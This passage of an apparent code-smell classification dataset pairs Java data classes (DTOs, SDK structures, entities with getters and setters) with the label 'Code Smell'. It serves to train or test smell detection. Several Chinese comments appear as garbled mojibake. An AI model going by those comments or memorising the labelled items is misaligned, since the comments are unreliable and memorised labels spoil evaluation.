  }
  public void setRoleIds(  List<String> roleIds){
    this.roleIds=roleIds;
  }
}
",1,Code Smell
"public static class TaskInfo {
  @ApiModelProperty(value=""task id"") private int id;
  @ApiModelProperty(value=""task type"") private int type;
  @ApiModelProperty(value=""db type"") private int dbType;
  @ApiModelProperty(value=""ip"") private String ip;
  @ApiModelProperty(value=""db port"") private int dbPort;
  @ApiModelProperty(value=""db name"") private String dbName;
  @ApiModelProperty(value=""user"") private String user;
  @ApiModelProperty(value=""password"") private String password;
  @ApiModelProperty(value=""sql"") private String sqlStatement;
  @ApiModelProperty(value=""total limit of data lines"") private int totalLimit;
  @ApiModelProperty(value=""the limit of one batch"") private int onceLimit;
  @ApiModelProperty(value=""task will be forced out after time limit"") private int timeLimit;
  @ApiModelProperty(value=""retry times if task failes"") private int retryTimes;
  @ApiModelProperty(value=""inlong groupid"") private String inlongGroupId;
  @ApiModelProperty(value=""inlong streamId"") private String inlongStreamId;
  public int getId(){
    return id;
  }
  public int getType(){
    return type;
  }
  public int getDBType(){
    return dbType;
  }
  public String getIp(){
    return ip;
  }
  public int getDBPort(){
    return dbPort;
  }
  public String getDBName(){
    return dbName;
  }
  public String getUser(){
    return user;
  }
  public String getPassword(){
    return password;
  }
  public String getSqlStatement(){
    return sqlStatement;
  }
  public int getTotalLimit(){
    return totalLimit;
  }
  public int getOnceLimit(){
    return onceLimit;
  }
  public int getTimeLimit(){
    return timeLimit;
  }
  public int getRetryTimes(){
    return retryTimes;
  }
  public String getInlongGroupId(){
    return inlongGroupId;
  }
  public String getInlongStreamId(){
    return inlongStreamId;
  }
  public void setId(  int id){
    this.id=id;
  }
  public void setType(  int type){
    this.type=type;
  }
  public void setDBType(  int dbType){
    this.dbType=dbType;
  }
  public void setIp(  String ip){
    this.ip=ip;
  }
  public void setDBPort(  int dbPort){
    this.dbPort=dbPort;
  }
  public void setDBName(  String dbName){
    this.dbName=dbName;
  }
  public void setUser(  String user){
    this.user=user;
  }
  public void setPassword(  String password){
    this.password=password;
  }
  public void setSqlStatement(  String sql){
    this.sqlStatement=sql;
  }
  public void setTotalLimit(  int totalLimit){
    this.totalLimit=totalLimit;
  }
  public void setOnceLimit(  int onceLimit){
    this.onceLimit=onceLimit;
  }
  public void setTimeLimit(  int timeLimit){
    this.timeLimit=timeLimit;
  }
  public void setRetryTimes(  int retryTimes){
    this.retryTimes=retryTimes;
  }
  public void setInlongGroupId(  String inlongGroupId){
    this.inlongGroupId=inlongGroupId;
  }
  public void setInlongStreamId(  String inlongStreamId){
    this.inlongStreamId=inlongStreamId;
  }
}
",1,Code Smell
"public final class CrawlSourceDynamicSqlSupport {
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final CrawlSource crawlSource=new CrawlSource();
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Integer> id=crawlSource.id;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<String> sourceName=crawlSource.sourceName;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<String> crawlRule=crawlSource.crawlRule;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Byte> sourceStatus=crawlSource.sourceStatus;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Date> createTime=crawlSource.createTime;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Date> updateTime=crawlSource.updateTime;
@Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final class CrawlSource extends SqlTable {
    public final SqlColumn<Integer> id=column(""id"",JDBCType.INTEGER);
    public final SqlColumn<String> sourceName=column(""source_name"",JDBCType.VARCHAR);
    public final SqlColumn<String> crawlRule=column(""crawl_rule"",JDBCType.VARCHAR);
    public final SqlColumn<Byte> sourceStatus=column(""source_status"",JDBCType.TINYINT);
    public final SqlColumn<Date> createTime=column(""create_time"",JDBCType.TIMESTAMP);
    public final SqlColumn<Date> updateTime=column(""update_time"",JDBCType.TIMESTAMP);
    public CrawlSource(){
      super(""crawl_source"");
    }
  }
}
",1,Code Smell
"private static class Node<E> {
  private E element;
  private Node<E> prev;
  private Node<E> next;
  public Node(){
    this(null,null,null);
  }
  public Node(  E element,  Node<E> prev,  Node<E> next){
    this.element=element;
    this.prev=prev;
    this.next=next;
  }
  public E getElement(){
    return element;
  }
  public void setElement(  E element){
    this.element=element;
  }
  public Node<E> getPrev(){
    return prev;
  }
  public void setPrev(  Node<E> prev){
    this.prev=prev;
  }
  public Node<E> getNext(){
    return next;
  }
  public void setNext(  Node<E> next){
    this.next=next;
  }
}
private static class Node<E> {
  private E element;
  private Node<E> next;
  public Node(){
    this(null,null);
  }
  public Node(  E element,  Node<E> next){
    this.element=element;
    this.next=next;
  }
  public E getElement(){
    return element;
  }
  public void setElement(  E element){
    this.element=element;
  }
  public Node<E> getNext(){
    return next;
  }
  public void setNext(  Node<E> next){
    this.next=next;
  }
}
",1,Code Smell
"/** 
 * Topic info for DataProxy, includes the topic name and the inlongGroupId to which it belongs.
 */
public class DataProxyTopicInfo {
  /** 
 * The topic name that needs to send data
 */
  private String topic;
  /** 
 * The inlongGroupId to which the topic belongs
 */
  private String inlongGroupId;
  /** 
 * The data format, will deprecate in the future
 */
  @Deprecated private String m;
  public DataProxyTopicInfo(){
  }
  public DataProxyTopicInfo(  String topic,  String inlongGroupId){
    this(topic,inlongGroupId,null);
  }
  public DataProxyTopicInfo(  String topic,  String inlongGroupId,  String m){
    this.topic=topic;
    this.inlongGroupId=inlongGroupId;
    this.m=m;
  }
  @Override public String toString(){
    return ""DataProxyTopicInfo{topic='"" + topic + '\''+ "", inlongGroupId='""+ inlongGroupId+ '\''+ "", m='""+ m+ '\''+ '}';
  }
  public String getTopic(){
    return topic;
  }
  public void setTopic(  String topic){
    this.topic=topic;
  }
  public String getInlongGroupId(){
    return inlongGroupId;
  }
  public void setInlongGroupId(  String inlongGroupId){
    this.inlongGroupId=inlongGroupId;
  }
  public String getM(){
    return m;
  }
  public void setM(  String m){
    this.m=m;
  }
  public boolean isValid(){
    return StringUtils.isNotBlank(inlongGroupId) && StringUtils.isNotBlank(topic);
  }
}
",1,Code Smell
"public class TaskContext {
  private final OptimizerContext optimizerContext;
  private final PhysicalPropertySet requiredProperty;
  private ColumnRefSet requiredColumns;
  private double upperBoundCost;
  private List<PhysicalOlapScanOperator> allPhysicalOlapScanOperators;
  public TaskContext(  OptimizerContext context,  PhysicalPropertySet physicalPropertySet,  ColumnRefSet requiredColumns,  double cost){
    this.optimizerContext=context;
    this.requiredProperty=physicalPropertySet;
    this.requiredColumns=requiredColumns;
    this.upperBoundCost=cost;
    this.allPhysicalOlapScanOperators=Collections.emptyList();
  }
  public OptimizerContext getOptimizerContext(){
    return optimizerContext;
  }
  public double getUpperBoundCost(){
    return upperBoundCost;
  }
  public PhysicalPropertySet getRequiredProperty(){
    return requiredProperty;
  }
  public ColumnRefSet getRequiredColumns(){
    return requiredColumns;
  }
  public void setRequiredColumns(  ColumnRefSet requiredColumns){
    this.requiredColumns=requiredColumns;
  }
  public void setUpperBoundCost(  double upperBoundCost){
    this.upperBoundCost=upperBoundCost;
  }
  public void setAllPhysicalOlapScanOperators(  List<PhysicalOlapScanOperator> allScanOperators){
    this.allPhysicalOlapScanOperators=allScanOperators;
  }
  public List<PhysicalOlapScanOperator> getAllPhysicalOlapScanOperators(){
    return allPhysicalOlapScanOperators;
  }
}
",1,Code Smell
"public static class NET_CFG_VideoWidgetCover extends SdkStructure {
  public int nStructSize;
  public int bEncodeBlend;
  public int bEncodeBlendExtra1;
  public int bEncodeBlendExtra2;
  public int bEncodeBlendExtra3;
  public int bEncodeBlendSnapshot;
  public NET_CFG_Color stuFrontColor=new NET_CFG_Color();
  public NET_CFG_Color stuBackColor=new NET_CFG_Color();
  public NET_CFG_Rect stuRect=new NET_CFG_Rect();
  public int bPreviewBlend;
  public NET_CFG_VideoWidgetCover(){
    this.nStructSize=this.size();
  }
}",1,Code Smell
"public static class NET_UAVCMD_VIDEO_START_CAPTURE extends SdkStructure {
  public NET_UAVCMD_COMMON stuCommon;
  public int nCameraID;
  public int nFrameSpeed;
  public int emResolution;
  public int nCustomWidth;
  public int nCustomHeight;
  public byte[] byReserved=new byte[8];
}",1,Code Smell
"/** 
 * 鐏典俊LED涓绘澘鑺傜洰瀹炰綋
 */
public class CfLinXinLedProgram implements Serializable {
  private Integer programNumber;
  private Integer programDataBlockSize;
  private Integer areaSize;
  private Integer programPlayMode;
  private Integer cyclePlaybackTimes;
  private List<CfLinXinLedArea> cfLinXinLedAreaList;
  public CfLinXinLedProgram(){
  }
  public CfLinXinLedProgram(  Integer programNumber,  Integer programPlayMode,  Integer cyclePlaybackTimes,  List<CfLinXinLedArea> cfLinXinLedAreaList) throws Exception {
    this.programNumber=programNumber;
    this.programPlayMode=programPlayMode;
    this.cyclePlaybackTimes=cyclePlaybackTimes;
    this.cfLinXinLedAreaList=cfLinXinLedAreaList;
    if (cfLinXinLedAreaList == null || cfLinXinLedAreaList.size() == 0) {
      throw new Exception(""璇疯嚦灏戜紶鍏ヤ竴涓尯鍩�"");
    }
    int areaDataSizeCount=0;
    for (    CfLinXinLedArea cfLinXinLedArea : cfLinXinLedAreaList) {
      areaDataSizeCount+=cfLinXinLedArea.getAreaDataBlockSize();
    }
    this.programDataBlockSize=26 + areaDataSizeCount;
    this.areaSize=cfLinXinLedAreaList.size();
  }
  public Integer getProgramNumber(){
    return programNumber;
  }
  public void setProgramNumber(  Integer programNumber){
    this.programNumber=programNumber;
  }
  public Integer getProgramDataBlockSize(){
    return programDataBlockSize;
  }
  public void setProgramDataBlockSize(  Integer programDataBlockSize){
    this.programDataBlockSize=programDataBlockSize;
  }
  public Integer getAreaSize(){
    return areaSize;
  }
  public void setAreaSize(  Integer areaSize){
    this.areaSize=areaSize;
  }
  public Integer getProgramPlayMode(){
    return programPlayMode;
  }
  public void setProgramPlayMode(  Integer programPlayMode){
    this.programPlayMode=programPlayMode;
  }
  public Integer getCyclePlaybackTimes(){
    return cyclePlaybackTimes;
  }
  public void setCyclePlaybackTimes(  Integer cyclePlaybackTimes){
    this.cyclePlaybackTimes=cyclePlaybackTimes;
  }
  public List<CfLinXinLedArea> getCfLinXinLedAreaList(){
    return cfLinXinLedAreaList;
  }
  public void setCfLinXinLedAreaList(  List<CfLinXinLedArea> cfLinXinLedAreaList){
    this.cfLinXinLedAreaList=cfLinXinLedAreaList;
  }
}",1,Code Smell
"public static class NET_ITC_VTLANE_PARAM extends Structure {
  public byte byRelatedDriveWay;
  public byte bySpeedCapEn;
  public byte bySignSpeed;
  public byte bySpeedLimit;
  public byte bySnapTimes;
  public byte byBigCarSignSpeed;
  public byte byBigCarSpeedLimit;
  public byte byRelatedIOOutEx;
  public NET_ITC_INTERVAL_PARAM struInterval=new NET_ITC_INTERVAL_PARAM();
  public byte[] byRelatedIOOut=new byte[MAX_IOOUT_NUM];
  public byte byFlashMode;
  public byte byLowSpeedLimit;
  public byte byBigCarLowSpeedLimit;
  public byte byRelaLaneDirectionType;
  public NET_ITC_PLATE_RECOG_REGION_PARAM[] struPlateRecog=new NET_ITC_PLATE_RECOG_REGION_PARAM[MAX_LANEAREA_NUM];
  public NET_VCA_LINE struLine=new NET_VCA_LINE();
}
",1,Code Smell
"/** 
 * 单元格显示设置
 */
class CellAppr {
  /** 
 * 前景色
 */
  private Color foreground=Color.black;
  /** 
 * 背景色
 */
  private Color background=Color.white;
  /** 
 * 字体
 */
  private Font font;
  /** 
 * 构造函数
 */
  public CellAppr(){
  }
  /** 
 * 构造函数
 * @param foreground 前景色
 * @param background 背景色
 */
  public CellAppr(  Color foreground,  Color background){
    this.foreground=foreground;
    this.background=background;
  }
  /** 
 * 取前景色
 * @return
 */
  public Color getForeground(){
    return foreground;
  }
  /** 
 * 取背景色
 * @return
 */
  public Color getBackground(){
    return background;
  }
  /** 
 * 设置前景色
 * @param c
 */
  public void setForeground(  Color c){
    foreground=c;
  }
  /** 
 * 设置背景色
 * @param c
 */
  public void setBackground(  Color c){
    background=c;
  }
  /** 
 * 设置字体
 * @param font
 */
  public void setFont(  Font font){
    this.font=font;
  }
  /** 
 * 取字体
 * @return
 */
  public Font getFont(){
    return font;
  }
  /** 
 * 配置应用到控件
 * @param c
 * @return
 */
  public Component apply(  Component c){
    if (c instanceof Container) {
      Container con=(Container)c;
      if (con.getComponentCount() == 0) {
        c.setForeground(getForeground());
        c.setBackground(getBackground());
        if (font != null) {
          c.setFont(font);
        }
      }
 else {
        Component[] cons=con.getComponents();
        for (int i=0; i < cons.length; i++) {
          apply(cons[i]);
        }
      }
    }
 else {
      c.setForeground(getForeground());
      c.setBackground(getBackground());
      if (font != null) {
        c.setFont(font);
      }
    }
    return c;
  }
}",1,Code Smell
"/** 
 * 淇濆瓨鍦╰oken淇℃伅閲岄潰鐨勭敤鎴蜂俊鎭� com.mall4j.cloud.auth.service.impl.AuthAccountServiceImpl com.mall4j.cloud.auth.controller.LoginController
 * @author FrozenWatermelon
 * @date 2020/7/3
 */
public class UserInfoInTokenBO {
  /** 
 * 鐢ㄦ埛鍦ㄨ嚜宸辩郴缁熺殑鐢ㄦ埛id
 */
  private Long userId;
  /** 
 * 鍏ㄥ眬鍞竴鐨刬d,
 */
  private Long uid;
  /** 
 * 绉熸埛id (鍟嗗id)
 */
  private Long tenantId;
  /** 
 * 绯荤粺绫诲瀷
 * @see SysTypeEnum
 */
  private Integer sysType;
  /** 
 * 鏄惁鏄鐞嗗憳
 */
  private Integer isAdmin;
  private String bizUserId;
  private String bizUid;
  public Long getUserId(){
    return userId;
  }
  public void setUserId(  Long userId){
    this.userId=userId;
  }
  public Long getUid(){
    return uid;
  }
  public void setUid(  Long uid){
    this.uid=uid;
  }
  public Integer getSysType(){
    return sysType;
  }
  public void setSysType(  Integer sysType){
    this.sysType=sysType;
  }
  public Integer getIsAdmin(){
    return isAdmin;
  }
  public void setIsAdmin(  Integer isAdmin){
    this.isAdmin=isAdmin;
  }
  public Long getTenantId(){
    return tenantId;
  }
  public void setTenantId(  Long tenantId){
    this.tenantId=tenantId;
  }
  public String getBizUserId(){
    return bizUserId;
  }
  public void setBizUserId(  String bizUserId){
    this.bizUserId=bizUserId;
  }
  public String getBizUid(){
    return bizUid;
  }
  public void setBizUid(  String bizUid){
    this.bizUid=bizUid;
  }
  @Override public String toString(){
    return ""UserInfoInTokenBO{"" + ""userId="" + userId + "", uid=""+ uid+ "", tenantId=""+ tenantId+ "", sysType=""+ sysType+ "", isAdmin=""+ isAdmin+ "", bizUserId='""+ bizUserId+ '\''+ "", bizUid='""+ bizUid+ '\''+ '}';
  }
}",1,Code Smell
"public static class ClickHouseJoin extends ClickHouseExpression {
  public enum JoinType {  INNER,   CROSS,   LEFT_OUTER,   RIGHT_OUTER,   FULL_OUTER,   LEFT_ANTI,   RIGHT_ANTI}
  private final ClickHouseTableReference leftTable;
  private final ClickHouseTableReference rightTable;
  private ClickHouseJoinOnClause onClause;
  private final ClickHouseJoin.JoinType type;
  public ClickHouseJoin(  ClickHouseTableReference leftTable,  ClickHouseTableReference rightTable,  ClickHouseJoin.JoinType type,  ClickHouseJoinOnClause onClause){
    this.leftTable=leftTable;
    this.rightTable=rightTable;
    this.onClause=onClause;
    this.type=type;
  }
  public ClickHouseJoin(  ClickHouseTableReference leftTable,  ClickHouseTableReference rightTable,  ClickHouseJoin.JoinType type){
    this.leftTable=leftTable;
    this.rightTable=rightTable;
    if (type != ClickHouseJoin.JoinType.CROSS) {
      throw new AssertionError();
    }
    this.onClause=null;
    this.type=type;
  }
  public ClickHouseTableReference getLeftTable(){
    return leftTable;
  }
  public ClickHouseTableReference getRightTable(){
    return rightTable;
  }
  public ClickHouseExpression getOnClause(){
    return onClause;
  }
  public ClickHouseJoin.JoinType getType(){
    return type;
  }
  public void setOnClause(  ClickHouseJoinOnClause onClause){
    this.onClause=onClause;
  }
}
",1,Code Smell
"@Entity public class AssignedAddress {
  @Id private Long id;
  private long networkId;
  @Convert(converter=AddressTypeConverter.class,columnType=Integer.class) private AddressType type;
  private byte[] addressBytes;
  private String addressString;
  private short prefix;
  @Generated(hash=294212135) public AssignedAddress(  Long id,  long networkId,  AddressType type,  byte[] addressBytes,  String addressString,  short prefix){
    this.id=id;
    this.networkId=networkId;
    this.type=type;
    this.addressBytes=addressBytes;
    this.addressString=addressString;
    this.prefix=prefix;
  }
  @Generated(hash=1516348015) public AssignedAddress(){
  }
  public Long getId(){
    return this.id;
  }
  public void setId(  Long l){
    this.id=l;
  }
  public AddressType getType(){
    return this.type;
  }
  public void setType(  AddressType addressType){
    this.type=addressType;
  }
  public short getPrefix(){
    return this.prefix;
  }
  public void setPrefix(  short s){
    this.prefix=s;
  }
  public long getNetworkId(){
    return this.networkId;
  }
  public void setNetworkId(  long j){
    this.networkId=j;
  }
  public byte[] getAddressBytes(){
    return this.addressBytes;
  }
  public void setAddressBytes(  byte[] bArr){
    this.addressBytes=bArr;
  }
  public String getAddressString(){
    return this.addressString;
  }
  public void setAddressString(  String str){
    this.addressString=str;
  }
  public enum AddressType {  UNKNOWN(0),   IPV4(1),   IPV6(2);   final int id;
  AddressType(  int i){
    this.id=i;
  }
  public String toString(){
    int i=this.id;
    if (i != 1) {
      return i != 2 ? ""Unknown"" : ""IPv6"";
    }
    return ""IPv4"";
  }
}
public static class AddressTypeConverter implements PropertyConverter<AddressType,Integer> {
    public AddressType convertToEntityProperty(    Integer num){
      if (num == null) {
        return null;
      }
      AddressType[] values=AddressType.values();
      for (      AddressType addressType : values) {
        if (addressType.id == num) {
          return addressType;
        }
      }
      return AddressType.UNKNOWN;
    }
    public Integer convertToDatabaseValue(    AddressType addressType){
      if (addressType == null) {
        return null;
      }
      return addressType.id;
    }
  }
}",1,Code Smell
"/** 
 * Thrown when an attempt to open a connection results in a response code not in the 2xx range.
 */
final class InvalidResponseCodeException extends HttpDataSourceException {
  /** 
 * The response code that was outside of the 2xx range. 
 */
  public final int responseCode;
  /** 
 * The http status message. 
 */
  @Nullable public final String responseMessage;
  /** 
 * An unmodifiable map of the response header fields and values. 
 */
  public final Map<String,List<String>> headerFields;
  /** 
 * The response body. 
 */
  public final byte[] responseBody;
  /** 
 * @deprecated Use {@link #InvalidResponseCodeException(int,String,IOException,Map,DataSpec,byte[])}.
 */
  @Deprecated public InvalidResponseCodeException(  int responseCode,  Map<String,List<String>> headerFields,  DataSpec dataSpec){
    this(responseCode,null,null,headerFields,dataSpec,Util.EMPTY_BYTE_ARRAY);
  }
  /** 
 * @deprecated Use {@link #InvalidResponseCodeException(int,String,IOException,Map,DataSpec,byte[])}.
 */
  @Deprecated public InvalidResponseCodeException(  int responseCode,  @Nullable String responseMessage,  Map<String,List<String>> headerFields,  DataSpec dataSpec){
    this(responseCode,responseMessage,null,headerFields,dataSpec,Util.EMPTY_BYTE_ARRAY);
  }
  public InvalidResponseCodeException(  int responseCode,  @Nullable String responseMessage,  @Nullable IOException cause,  Map<String,List<String>> headerFields,  DataSpec dataSpec,  byte[] responseBody){
    super(""Response code: "" + responseCode,cause,dataSpec,PlaybackException.ERROR_CODE_IO_BAD_HTTP_STATUS,TYPE_OPEN);
    this.responseCode=responseCode;
    this.responseMessage=responseMessage;
    this.headerFields=headerFields;
    this.responseBody=responseBody;
  }
}",1,Code Smell
"public class CheckPointListVO {
  @NotNull(message=""application can be null"") @ApiModelProperty(value=""applicationId"") private String applicationId;
  @NotNull(message=""jobId can be null"") private String jobId;
  private String engineJobId;
  private boolean getSavePointPath;
  public boolean isGetSavePointPath(){
    return getSavePointPath;
  }
  public void setGetSavePointPath(  boolean getSavePointPath){
    this.getSavePointPath=getSavePointPath;
  }
  public String getJobId(){
    return jobId;
  }
  public void setJobId(  String jobId){
    this.jobId=jobId;
  }
  public String getApplicationId(){
    return applicationId;
  }
  public void setApplicationId(  String applicationId){
    this.applicationId=applicationId;
  }
  public String getEngineJobId(){
    return engineJobId;
  }
  public void setEngineJobId(  String engineJobId){
    this.engineJobId=engineJobId;
  }
}
",1,Code Smell
"/** 
 * date: 2022/1/24 2:58 涓嬪崍 author: zhaiyue
 */
public class DevelopSysParameter {
  private long id;
  private String paramName;
  private String paramCommand;
  /** 
 * 鏄惁鍒犻櫎
 */
  private int isDeleted;
  public Integer getIsDeleted(){
    return isDeleted;
  }
  public void setIsDeleted(  Integer isDeleted){
    this.isDeleted=isDeleted;
  }
  public boolean strIsSysParam(  String str){
    if (StringUtils.isEmpty(str)) {
      return false;
    }
    String target=String.format(""${%s}"",this.getParamName());
    return target.equals(str);
  }
  public long getId(){
    return id;
  }
  public void setId(  long id){
    this.id=id;
  }
  public String getParamName(){
    return paramName;
  }
  public void setParamName(  String paramName){
    this.paramName=paramName;
  }
  public String getParamCommand(){
    return paramCommand;
  }
  public void setParamCommand(  String paramCommand){
    this.paramCommand=paramCommand;
  }
  public void setIsDeleted(  int isDeleted){
    this.isDeleted=isDeleted;
  }
}",1,Code Smell
"public class CloudResourceSummary {
  private String resourceType;
  private Integer count;
  public String getResourceType(){
    return resourceType;
  }
  public void setResourceType(  String resourceType){
    this.resourceType=resourceType;
  }
  public Integer getCount(){
    return count;
  }
  public void setCount(  Integer count){
    this.count=count;
  }
}
",1,Code Smell
"public class FetchContext {
  private Partition partition;
  private long usedToken;
  private boolean lastConsumed=false;
  private boolean success=false;
  private int errCode=0;
  private String errMsg="""";
  private long currOffset=TBaseConstants.META_VALUE_UNDEFINED;
  private String confirmContext="""";
  private List<Message> messageList=new ArrayList<>();
  private long maxOffset=TBaseConstants.META_VALUE_UNDEFINED;
  public FetchContext(  PartitionSelectResult selectResult){
    this.partition=selectResult.getPartition();
    this.usedToken=selectResult.getUsedToken();
    this.lastConsumed=selectResult.isLastPackConsumed();
  }
  public void setFailProcessResult(  int errCode,  String errMsg){
    this.success=false;
    this.errCode=errCode;
    this.errMsg=errMsg;
  }
  public void setSuccessProcessResult(  long currOffset,  String confirmContext,  List<Message> messageList,  long maxOffset){
    this.success=true;
    this.errCode=TErrCodeConstants.SUCCESS;
    this.errMsg=""Ok!"";
    if (currOffset >= 0) {
      this.currOffset=currOffset;
    }
    this.confirmContext=confirmContext;
    this.messageList=messageList;
    if (maxOffset >= 0) {
      this.maxOffset=maxOffset;
    }
  }
  public Partition getPartition(){
    return partition;
  }
  public String getPartitionKey(){
    return partition.getPartitionKey();
  }
  public long getUsedToken(){
    return usedToken;
  }
  public boolean isLastConsumed(){
    return lastConsumed;
  }
  public boolean isSuccess(){
    return success;
  }
  public int getErrCode(){
    return errCode;
  }
  public String getErrMsg(){
    return errMsg;
  }
  public List<Message> getMessageList(){
    return messageList;
  }
  public long getCurrOffset(){
    return currOffset;
  }
  public String getConfirmContext(){
    return confirmContext;
  }
  public long getMaxOffset(){
    return maxOffset;
  }
}",1,Code Smell
"@JSONType(serialzeFeatures=SerializerFeature.WriteMapNullValue) public static class Pojo2 {
  @JSONField(ordinal=0) public Object[] l;
  @JSONField(ordinal=1) public String s;
  @JSONField(ordinal=2) public Boolean b;
  @JSONField(ordinal=3) public Integer i;
  @JSONField(ordinal=4) public Object o;
}",1,Code Smell
"public static class NET_EM_CFG_TRAFFICSTROBE_CTRTYPE extends SdkStructure {
  public static final int NET_EM_CFG_CTRTYPE_UNKNOWN=0;
  public static final int NET_EM_CFG_CTRTYPE_TRAFFICTRUSTLIST=1;
  public static final int NET_EM_CFG_CTRTYPE_ALLSNAPCAR=2;
  public static final int NET_EM_CFG_CTRTYPE_ORDER=3;
}",1,Code Smell
"/** 
 * @author FrozenWatermelon
 * @date 2020-11-11 13:49:06
 */
public class SpuExtension extends BaseModel implements Serializable {
  private static final long serialVersionUID=1L;
  /** 
 * 鍟嗗搧鎵╁睍淇℃伅琛╥d
 */
  private Long spuExtendId;
  /** 
 * 鍒涘缓鏃堕棿
 */
  private Date createTime;
  /** 
 * 鏇存柊鏃堕棿
 */
  private Date updateTime;
  /** 
 * 鍟嗗搧id
 */
  private Long spuId;
  /** 
 * 閿�閲�
 */
  private Integer saleNum;
  /** 
 * 瀹為檯搴撳瓨
 */
  private Integer actualStock;
  /** 
 * 閿佸畾搴撳瓨
 */
  private Integer lockStock;
  /** 
 * 鍙敭鍗栧簱瀛�
 */
  private Integer stock;
  public Long getSpuExtendId(){
    return spuExtendId;
  }
  public void setSpuExtendId(  Long spuExtendId){
    this.spuExtendId=spuExtendId;
  }
  public Long getSpuId(){
    return spuId;
  }
  public void setSpuId(  Long spuId){
    this.spuId=spuId;
  }
  public Integer getSaleNum(){
    return saleNum;
  }
  public void setSaleNum(  Integer saleNum){
    this.saleNum=saleNum;
  }
  public Integer getActualStock(){
    return actualStock;
  }
  public void setActualStock(  Integer actualStock){
    this.actualStock=actualStock;
  }
  public Integer getLockStock(){
    return lockStock;
  }
  public void setLockStock(  Integer lockStock){
    this.lockStock=lockStock;
  }
  public Integer getStock(){
    return stock;
  }
  public void setStock(  Integer stock){
    this.stock=stock;
  }
  @Override public String toString(){
    return ""SpuExtension{"" + ""spuExtendId="" + spuExtendId + "",createTime=""+ createTime+ "",updateTime=""+ updateTime+ "",spuId=""+ spuId+ "",saleNum=""+ saleNum+ "",actualStock=""+ actualStock+ "",lockStock=""+ lockStock+ "",stock=""+ stock+ '}';
  }
}",1,Code Smell
"public class SelectListItem implements ParseNode {
  private Expr expr;
  private final TableName tblName;
  private final boolean isStar;
  private String alias;
  private final NodePosition pos;
  public SelectListItem(  Expr expr,  String alias){
    this(expr,alias,NodePosition.ZERO);
  }
  public SelectListItem(  TableName tblName){
    this(tblName,NodePosition.ZERO);
  }
  public SelectListItem(  Expr expr,  String alias,  NodePosition pos){
    Preconditions.checkNotNull(expr);
    this.pos=pos;
    this.expr=expr;
    this.alias=alias;
    this.tblName=null;
    this.isStar=false;
  }
  public SelectListItem(  TableName tblName,  NodePosition pos){
    this.pos=pos;
    this.expr=null;
    this.tblName=tblName;
    this.isStar=true;
  }
  protected SelectListItem(  SelectListItem other){
    pos=other.pos;
    if (other.expr == null) {
      expr=null;
    }
 else {
      expr=other.expr.clone().reset();
    }
    tblName=other.tblName;
    isStar=other.isStar;
    alias=other.alias;
  }
  @Override public NodePosition getPos(){
    return pos;
  }
  @Override public SelectListItem clone(){
    return new SelectListItem(this);
  }
  public boolean isStar(){
    return isStar;
  }
  public TableName getTblName(){
    return tblName;
  }
  public Expr getExpr(){
    return expr;
  }
  public void setExpr(  Expr expr){
    this.expr=expr;
  }
  public String getAlias(){
    return alias;
  }
  public void setAlias(  String alias){
    this.alias=alias;
  }
}
",1,Code Smell
"public class UserDTO {
  private String userName;
  private String phoneNumber;
  private String email;
  private Integer status;
  private Integer rootUser;
  private Long tenantId;
  public Long getTenantId(){
    return tenantId;
  }
  public void setTenantId(  Long tenantId){
    this.tenantId=tenantId;
  }
  public Integer getRootUser(){
    return rootUser;
  }
  public void setRootUser(  Integer rootUser){
    this.rootUser=rootUser;
  }
  public String getUserName(){
    return userName;
  }
  public void setUserName(  String userName){
    this.userName=userName;
  }
  public String getPhoneNumber(){
    return phoneNumber;
  }
  public void setPhoneNumber(  String phoneNumber){
    this.phoneNumber=phoneNumber;
  }
  public String getEmail(){
    return email;
  }
  public void setEmail(  String email){
    this.email=email;
  }
  public Integer getStatus(){
    return status;
  }
  public void setStatus(  Integer status){
    this.status=status;
  }
}
",1,Code Smell
"public class NET_SYSTEM_STATUS extends NetSDKLib.SdkStructure {
  /** 
 * dwSize;
 */
  public int dwSize;
  /** 
 * CPU鐘舵�� NET_CPU_STATUS
 */
  public Pointer pstuCPU;
  /** 
 * 鍐呭瓨鐘舵�� NET_MEMORY_STATUS
 */
  public Pointer pstuMemory;
  /** 
 * 椋庢墖鐘舵�� NET_FAN_STATUS
 */
  public Pointer pstuFan;
  /** 
 * 鐢垫簮鐘舵�� NET_POWER_STATUS
 */
  public Pointer pstuPower;
  /** 
 * 娓╁害鐘舵�� NET_TEMPERATURE_STATUS
 */
  public Pointer pstuTemp;
  public NET_SYSTEM_STATUS(){
    this.dwSize=this.size();
  }
}
",1,Code Smell
"public static class AppInfo {
  @Nullable public String sourceDir;
  @Nullable public String dataDir;
  @Nullable public String dataDeDir;
  public List<String> extDataDirs=Collections.emptyList();
  @Nullable public String jniDir;
  @Nullable public AppUsageStatsManager.DataUsage dataUsage;
  @Nullable public PackageSizeInfo sizeInfo;
  @Nullable public String installerApp;
  @Nullable public Intent mainActivity;
  @Nullable public String seInfo;
  @Nullable public String primaryCpuAbi;
  @Nullable public String zygotePreloadName;
  public int hiddenApiEnforcementPolicy;
}
",1,Code Smell
"/** 
 * SLOGAN:鏀瑰彉涓栫晫锛佹敼鍙樻湭鏉ワ紒
 * @author tz
 * @Description :
 * @Date : 2021/12/30 11:19
 */
@ApiModel(""鏁版嵁婧愬垪琛ㄤ俊鎭�"") public class DsInfoVO {
  @ApiModelProperty(""鏁版嵁婧怚d"") private Long dataInfoId;
  @ApiModelProperty(value=""鏁版嵁婧愬悕绉�"",example=""mysql"") private String dataName;
  @ApiModelProperty(value=""鏁版嵁婧愮被鍨嬫灇涓�"") private Integer dataTypeCode;
  public Long getDataInfoId(){
    return dataInfoId;
  }
  public void setDataInfoId(  Long dataInfoId){
    this.dataInfoId=dataInfoId;
  }
  public String getDataName(){
    return dataName;
  }
  public void setDataName(  String dataName){
    this.dataName=dataName;
  }
  public Integer getDataTypeCode(){
    return dataTypeCode;
  }
  public void setDataTypeCode(  Integer dataTypeCode){
    this.dataTypeCode=dataTypeCode;
  }
}",1,Code Smell
"/** 
 * @Description
 * @Author luohaiyang
 * @Date 2022/3/22
 */
public class LoginRequestPacket extends Packet {
  private String userId;
  private String userName;
